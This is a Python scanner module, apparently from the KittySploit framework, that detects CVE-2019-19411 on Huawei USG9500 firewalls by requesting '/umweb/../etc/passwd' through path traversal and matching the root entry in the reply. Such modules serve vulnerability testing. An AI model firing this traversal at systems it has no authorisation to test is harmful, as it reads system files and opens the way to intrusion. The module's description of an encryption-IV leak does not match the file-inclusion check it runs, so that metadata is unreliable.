#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""USG9500 with versions of V500R001C30SPC100, V500R001C30SPC200, V500R001C30SPC600, V500R001C60SPC500, V500R005C."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Huawei Firewall - Local File Inclusion Detection',
        'description': 'USG9500 with versions of V500R001C30SPC100, V500R001C30SPC200, V500R001C30SPC600, V500R001C60SPC500, V500R005C00SPC100, V500R005C00SPC200 have an information leakage vulnerability. Due to improper processing of the initialization vector used in a specific encryption algorithm, an attacker who gains access to this cryptographic primitive may exploit this vulnerability to cause the value of the confidentiality associated with its use to be diminished.',
        'author': ['KittySploit Team'],
        'severity': 'low',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'huawei', 'firewall', 'lfi', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://www.huawei.com/en/psirt/security-advisories/huawei-sa-20200115-01-firewall-en'],
        'cve': 'CVE-2019-19411',
    }

    def run(self):
        r = self.http_request(method="GET", path='/umweb/../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_any = ('application/octet-stream',)
        body_regexes = ('root:[x*]:0:0:',)
        if (any(m in headers for m in header_any)) and (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='low',
                reason="Huawei Firewall - Local File Inclusion detected",
                path='/umweb/../etc/passwd',
            )
            return True
        return False

